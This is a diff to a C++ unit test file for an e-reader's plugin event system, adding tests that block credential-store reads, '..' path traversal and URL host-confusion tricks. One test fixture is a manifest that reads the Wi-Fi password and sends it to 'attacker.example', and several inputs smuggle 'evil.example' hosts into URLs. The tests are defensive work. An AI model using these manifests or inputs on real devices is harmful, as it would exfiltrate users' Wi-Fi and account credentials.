@@ -1,12 +1,17 @@
 // Plugin events without the card or the network (src/util/PluginEventCore.h): subscriptions read from the manifests
-// of real Plugin Hub plugins, the queue line, the require_meta filter, the drain's manifest and the templates.
+// of real Plugin Hub plugins, the queue line, the require_meta filter, the drain's manifest, the templates, the token
+// and config files a drain may read and the hosts its requests may go to.
 #include <PluginEventCore.h>
+#include <ProtectedPaths.h>
 #include <gtest/gtest.h>
 
 #include <cstring>
 #include <fstream>
 #include <sstream>
 #include <string>
+#include <string_view>
+
+#include "network/PluginHosts.h"
 
 using namespace plugin_events;
 
@@ -146,15 +151,68 @@ TEST(PluginEventCore, HandlersAreReadFromTheManifest) {
   EXPECT_TRUE(handlerFor(broken.as<JsonVariantConst>(), Event::ReaderExit).isNull());
 }
 
+namespace {
+// The device asks isProtectedPluginFile() (src/network/WebPathGuard.cpp): ProtectedPaths judged as a folder walked
+// through with hidden names allowed, its 8.3 aliases looked up on the card. No alias on this card.
+bool refusedLikeTheWebServer(const std::string& path) {
+  return ProtectedPaths::isProtectedPath(path, ProtectedPaths::Target::Directory, true,
+                                         [](std::string_view, std::string_view) { return false; });
+}
+bool refusesNothing(const std::string&) { return false; }
+std::string lastChecked;
+bool recordsTheCheck(const std::string& path) {
+  lastChecked = path;
+  return false;
+}
+}  // namespace
+
 TEST(PluginEventCore, PluginFilesAndTokenPaths) {
-  EXPECT_EQ(pluginFile("/.crosspoint/plugins/readeck", "token.json"), "/.crosspoint/plugins/readeck/token.json");
-  EXPECT_EQ(pluginFile("/.crosspoint/plugins/x", "/.crosspoint/x.json"), "/.crosspoint/x.json");
-  EXPECT_EQ(pluginFile("/p", ""), "");
+  const std::string dir = "/.crosspoint/plugins/readeck";
+  EXPECT_EQ(pluginFile(dir, "token.json", refusedLikeTheWebServer), "/.crosspoint/plugins/readeck/token.json");
+  // Absolute names as the Plugin Hub's plugins write them (lingoblend, leaf, cp-orbit), normalised.
+  EXPECT_EQ(pluginFile(dir, "/.crosspoint/lingoblend.json", refusedLikeTheWebServer), "/.crosspoint/lingoblend.json");
+  EXPECT_EQ(pluginFile(dir, "/.crosspoint/.leaf-token.json", refusedLikeTheWebServer), "/.crosspoint/.leaf-token.json");
+  EXPECT_EQ(pluginFile(dir, "/.cp-orbit/config.json", refusedLikeTheWebServer), "/.cp-orbit/config.json");
+  EXPECT_EQ(pluginFile(dir, "//.crosspoint/./x.json", refusedLikeTheWebServer), "/.crosspoint/x.json");
+  EXPECT_EQ(pluginFile(dir, "", refusedLikeTheWebServer), "");
+  EXPECT_EQ(pluginFile(dir, nullptr, refusedLikeTheWebServer), "");
   const JsonDocument token = parsed(R"({"data":{"access_token":"tok-1"},"list":["a","b"],"n":7})");
   EXPECT_EQ(valueAt(token.as<JsonVariantConst>(), "data.access_token"), "tok-1");
   EXPECT_EQ(valueAt(token.as<JsonVariantConst>(), "list.1"), "b");
   EXPECT_EQ(valueAt(token.as<JsonVariantConst>(), "n"), "7");
   EXPECT_EQ(valueAt(token.as<JsonVariantConst>(), "missing.x"), "");
+}
+
+// A name with ".." names nothing, as on the web side (PluginLocations::namesPath()): a relative one would climb out of
+// the plugin's folder, and an absolute one is refused alike rather than resolved.
+TEST(PluginEventCore, APluginFileWithDotDotNamesNothing) {
+  const std::string dir = "/.crosspoint/plugins/x";
+  for (const char* name : {"../other/token.json", "../../wifi.json", "/.crosspoint/plugins/x/../../wifi.json",
+                           "sub/../token.json", ".."}) {
+    EXPECT_EQ(pluginFile(dir, name, refusesNothing), "") << name;
+  }
+}
+
+// The exploit: a device.json naming the Wi-Fi store as its token file, and a sleep.enter request carrying {token}. The
+// web server never lets a plugin read a credential store; the drain now reads by the same rules.
+TEST(PluginEventCore, ACredentialStoreIsNeverAPluginFile) {
+  const std::string dir = "/.crosspoint/plugins/x";
+  for (const char* name :
+       {"/.crosspoint/wifi.json", "/.CrossPoint/WiFi.json", "/.crosspoint/opds.json", "/.crosspoint/koreader.json",
+        "/.crosspoint/wifi.json.bak", "//.crosspoint/./wifi.json", "/System Volume Information/x.json"}) {
+    EXPECT_EQ(pluginFile(dir, name, refusedLikeTheWebServer), "") << name;
+  }
+  // The check is asked about the resolved absolute path, not the name as written.
+  lastChecked.clear();
+  EXPECT_EQ(pluginFile(dir, "config.json", recordsTheCheck), "/.crosspoint/plugins/x/config.json");
+  EXPECT_EQ(lastChecked, "/.crosspoint/plugins/x/config.json");
+}
+
+// The config file is refused the same way: its values fill the URL, the headers and the body.
+TEST(PluginEventCore, AProtectedConfigFileIsRefused) {
+  const JsonDocument manifest = parsed(R"({"config":{"file":"/.crosspoint/koreader.json"},
+    "events":{"reader.session":{"request":{"url":"https://sync.example/{cfg.password}"}}}})");
+  EXPECT_EQ(pluginFile("/.crosspoint/plugins/x", manifest["config"]["file"] | "", refusedLikeTheWebServer), "");
 }
 
 TEST(PluginEventCore, TemplatesFillTheKosyncRequest) {
@@ -196,6 +254,63 @@ TEST(PluginEventCore, TemplatesTokenMetaAndEventFields) {
 
 TEST(PluginEventCore, EscapeUrl) { EXPECT_EQ(escapeUrl("https://x/a b?q=1&r=ä#f"), "https://x/a%20b?q=1&r=%C3%A4#f"); }
 
+// A drain sends a line only to a host the plugin may reach, judged on the URL as filled in (handlerUrl()). A plugin
+// written for upstream lists no allowedHosts: without an approval it reaches nothing.
+TEST(PluginEventCore, AnEventUrlToAHostNotAllowedIsRefused) {
+  const JsonDocument manifest =
+      parsed(R"({"token":{"file":"/.crosspoint/wifi.json","path":"networks.0.password"},"events":{
+    "sleep.enter":{"request":{"url":"https://attacker.example/{token}"}}}})");
+  const JsonVariantConst handler = handlerFor(manifest.as<JsonVariantConst>(), Event::SleepEnter);
+  ASSERT_FALSE(handler.isNull());
+  TemplateContext ctx;
+  ctx.token = "secret";
+  const std::string url = handlerUrl(handler, ctx);
+  EXPECT_EQ(url, "https://attacker.example/secret");
+  const PluginHosts::Reach nothing{};
+  EXPECT_FALSE(nothing.allows(url));
+  PluginHosts::Reach other;
+  other.allow("sync.example");
+  other.approve("img.example");
+  EXPECT_FALSE(other.allows(url));
+  PluginHosts::Reach approved;
+  approved.approve("attacker.example");  // what the user said yes to, the plugin may reach
+  EXPECT_TRUE(approved.allows(url));
+}
+
+// The host comes out of the config file: it is the filled-in URL that is judged, whatever the template spelled.
+TEST(PluginEventCore, ATemplateThatExpandsIntoAnotherHostIsRefused) {
+  const JsonDocument manifest = parsed(kKosyncAutopush);
+  const JsonVariantConst handler = handlerFor(manifest.as<JsonVariantConst>(), Event::ReaderSession);
+  PluginHosts::Reach reach;
+  reach.approve("sync.example");  // approved when the plugin's card tested its login through the relay
+  TemplateContext ctx;
+
+  const JsonDocument own = parsed(R"({"server":"https://sync.example"})");
+  ctx.cfg = own.as<JsonVariantConst>();
+  EXPECT_TRUE(reach.allows(handlerUrl(handler, ctx)));
+
+  for (const char* server :
+       {R"({"server":"https://evil.example"})", R"({"server":"https://sync.example.evil.example"})",
+        R"({"server":"https://sync.example@evil.example"})", R"({"server":"https://evil.example:443@sync.example"})",
+        R"({"server":"https://evil.example\\.sync.example"})"}) {
+    const JsonDocument cfg = parsed(server);
+    ctx.cfg = cfg.as<JsonVariantConst>();
+    EXPECT_FALSE(reach.allows(handlerUrl(handler, ctx))) << handlerUrl(handler, ctx);
+  }
+
+  // A fixed host with a filled-in tail: user info or a host suffix from the config moves the request elsewhere.
+  const JsonDocument tail = parsed(R"({"events":{"reader.open":{"request":{"url":"https://sync.example{cfg.x}/p"}}}})");
+  const JsonVariantConst open = handlerFor(tail.as<JsonVariantConst>(), Event::ReaderOpen);
+  for (const char* x : {R"({"x":"@evil.example"})", R"({"x":".evil.example"})", R"({"x":":443@evil.example"})"}) {
+    const JsonDocument cfg = parsed(x);
+    ctx.cfg = cfg.as<JsonVariantConst>();
+    EXPECT_FALSE(reach.allows(handlerUrl(open, ctx))) << handlerUrl(open, ctx);
+  }
+  const JsonDocument port = parsed(R"({"x":":8443"})");
+  ctx.cfg = port.as<JsonVariantConst>();
+  EXPECT_TRUE(reach.allows(handlerUrl(open, ctx)));
+}
+
 // The plugins the web Home Screen page makes for a picture from the web (js/home-layout.js webPicturePlugin; the page's
 // test checks it makes exactly these): the device subscribes to them and reads where each picture goes.
 TEST(PluginEventCore, HomePicturePluginsSubscribe) {
@@ -224,4 +339,15 @@ TEST(PluginEventCore, HomePicturePluginsSubscribe) {
   const JsonVariantConst afterBook = handlerFor(fixture["close"].as<JsonVariantConst>(), Event::ReaderExit);
   ASSERT_TRUE(isDownload(afterBook));
   EXPECT_STREQ(afterBook["download"]["dest"] | "", "/home/web/web-2.png");
+
+  // Their manifests list the picture's host and its subdomains (home_layout_test.mjs checks the page writes these), so
+  // the drain's host check lets their downloads through.
+  PluginHosts::Reach reach;
+  reach.allow("img.example");
+  reach.allow(".img.example");
+  const TemplateContext ctx{};
+  EXPECT_TRUE(reach.allows(handlerUrl(atSleep, ctx)));
+  EXPECT_TRUE(reach.allows(handlerUrl(afterBook, ctx)));
+  EXPECT_TRUE(reach.allows("https://cdn.img.example/today.png"));  // a redirect to the service's own CDN
+  EXPECT_FALSE(reach.allows("https://cdn.example/today.png"));
 }
